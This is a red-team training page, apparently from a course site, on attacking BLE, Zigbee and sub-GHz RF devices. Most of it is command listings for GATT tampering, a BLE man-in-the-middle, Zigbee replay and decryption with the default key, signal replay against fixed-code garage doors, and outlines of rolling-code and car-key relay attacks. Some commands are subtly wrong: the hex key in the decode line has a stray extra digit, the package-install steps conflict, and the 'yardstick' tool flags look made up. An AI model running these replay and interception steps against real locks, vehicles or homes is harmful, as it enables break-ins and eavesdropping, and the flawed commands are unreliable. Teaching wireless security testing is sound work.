---
layout: training-page
title: "BLE & RF Attacks — Red Team Academy"
module: "IoT Hacking"
tags:
  - ble
  - bluetooth
  - zigbee
  - rf
  - replay-attack
  - sdr
page_key: "iot-ble-rf"
render_with_liquid: false
---

# BLE & RF Attacks

Wireless protocols — BLE (Bluetooth Low Energy), Zigbee, Z-Wave, and proprietary 433/868/915MHz RF — are pervasive in IoT. Attack techniques include passive sniffing, device enumeration, GATT characteristic abuse, RF replay attacks, and protocol-level attacks on Zigbee mesh networks.

## BLE Scanning & Enumeration

```
# Install tools:
apt install bluetooth bluez
pip3 install bleak gattacker

# Scan for BLE devices:
hciconfig hci0 up
hcitool lescan              # passive scan
bluetoothctl scan on       # interactive

# List nearby devices:
hcitool lescan --passive 2>/dev/null | head -20

# gatttool — GATT attribute read/write:
gatttool -b AA:BB:CC:DD:EE:FF -I
# Interactive commands:
connect
primary                        # list GATT services
characteristics               # list characteristics
char-read-hnd 0x0012          # read by handle
char-write-req 0x0012 0100    # write to handle (enable notifications)

# Bleak (Python async BLE library):
python3 -c "
import asyncio
from bleak import BleakScanner, BleakClient

async def scan():
    devices = await BleakScanner.discover()
    for d in devices:
        print(d.address, d.name, d.rssi)

asyncio.run(scan())
"

# nRF Connect (Android) — visual GATT explorer
# BLE-Scanner app — enumerate services and characteristics
```

## BLE Sniffing with Ubertooth

```
# Ubertooth One — BLE sniffer hardware (~$120)
# Install ubertooth-utils:
apt install ubertooth

# Follow a specific connection:
ubertooth-btle -f -A 37   # follow on advertising channel 37

# Sniff all advertising packets:
ubertooth-btle -p          # promiscuous mode

# Capture to PCAP for Wireshark:
ubertooth-btle -f -c capture.pcap

# Decode in Wireshark:
# Open capture.pcap → filter: btatt (GATT), btl2cap, btle

# Alternative: TI CC2540 USB dongle + SmartRF Packet Sniffer (Windows)
# Or: Nordic nRF Sniffer for Wireshark (free)
```

## BLE MITM Attack with Gattacker

```
# Gattacker: Node.js BLE proxy for MITM
npm install -g gattacker

# Set up proxy between BLE device and phone:
# 1. Run gattacker on Linux with 2 BLE adapters
# 2. Masquerade as target device to phone
# 3. Forward all GATT operations to real device
# 4. Intercept and modify in transit

# Usage:
node ws-intercept.js   # WebSocket intercept server
node scan.js           # scan for devices
node devices.js        # connect to device and proxy
```

## RF Replay Attacks (433/868/915 MHz)

```
# Equipment:
# - RTL-SDR (receive only, ~$25) — for sniffing
# - HackRF One (~$300) — transmit + receive
# - YARD Stick One (~$100) — sub-GHz transmit/receive

# Identify RF protocol:
# Use rtl_433 for automatic decoding of common IoT protocols:
rtl_433               # auto-detect and decode
rtl_433 -f 433.92M    # specify frequency (433.92MHz common)
rtl_433 -A            # analyze protocol timing

# Capture to file:
rtl_433 -S all -T 60  # save all signals for 60 seconds

# RTL-SDR + GNU Radio for raw capture:
rtl_sdr -f 433920000 -s 250000 capture.iq   # capture IQ data
# Analyze in GQRX, GNU Radio, or Universal Radio Hacker (URH)

# Universal Radio Hacker (URH) — best for IoT RF analysis:
pip3 install urh
urh                # GUI application
# Features: record, demodulate, decode, analyze, replay

# Replay attack with HackRF:
# Step 1: Record target signal:
hackrf_transfer -r capture.iq -f 433920000 -s 2000000

# Step 2: Replay:
hackrf_transfer -t capture.iq -f 433920000 -s 2000000 -x 20

# YARD Stick One replay (simpler for sub-GHz):
yardstick -f 433920000 --rx  # receive
yardstick -f 433920000 --tx  # transmit (replay)
```

## Zigbee Attacks with KillerBee

```
# Zigbee = IEEE 802.15.4 based mesh network protocol
# Used in: smart home (Philips Hue, SmartThings), building automation

# Equipment: Atmel RZUSBstick or TI CC2531 USB dongle
# Install KillerBee:
git clone https://github.com/riverloopsec/killerbee
cd killerbee && python3 setup.py install

# Scan for Zigbee networks:
zbdump -i /dev/ttyUSB0 -c 11 -w capture.pcap   # channel 11 (11-26)
zbstumbler -i /dev/ttyUSB0                       # network discovery

# Capture Zigbee traffic:
zbdump -i /dev/ttyUSB0 -c 15 -w zigbee.pcap

# Replay Zigbee packets:
zbreplay -i /dev/ttyUSB0 -r capture.pcap

# Decrypt Zigbee (if default transport key):
# Default Zigbee key: 5A:69:67:42:65:65:41:6C:6C:69:61:6E:63:65:30:39
zbdecode -n 5A6967426565416C6C69616E636530390 -r capture.pcap

# Wireshark Zigbee decryption:
# Edit → Preferences → Protocols → ZigBee → add transport key
```

## Garage Door / Key Fob Attacks

```
# Fixed-code garage doors (older) — simple replay:
# 1. Capture with RTL-SDR
# 2. Replay with HackRF — opens door

# Rolling-code attacks (KeeLoq):
# Rolljam attack (Samy Kamkar): jam + record → jam + record → replay first
# Requires 2 SDR radios

# Car key relay attack (passive entry):
# Relay attack: amplify key fob signal across distance
# Equipment: Relay Attack Boards (2× LF/UHF relays, ~$100)
# No crypto needed — relay the existing signal

# Detection: put key in Faraday cage/signal blocker
```

## Tools & Resources

- URH (Universal Radio Hacker) — `github.com/jopohl/urh`
- rtl_433 — `github.com/merbanan/rtl_433`
- KillerBee — `github.com/riverloopsec/killerbee`
- HackRF — `greatscottgadgets.com/hackrf/`
- YARD Stick One — `greatscottgadgets.com/yardstickone/`
- Ubertooth — `greatscottgadgets.com/ubertoothone/`
- Bluetooth Security — `github.com/securing/gattacker`
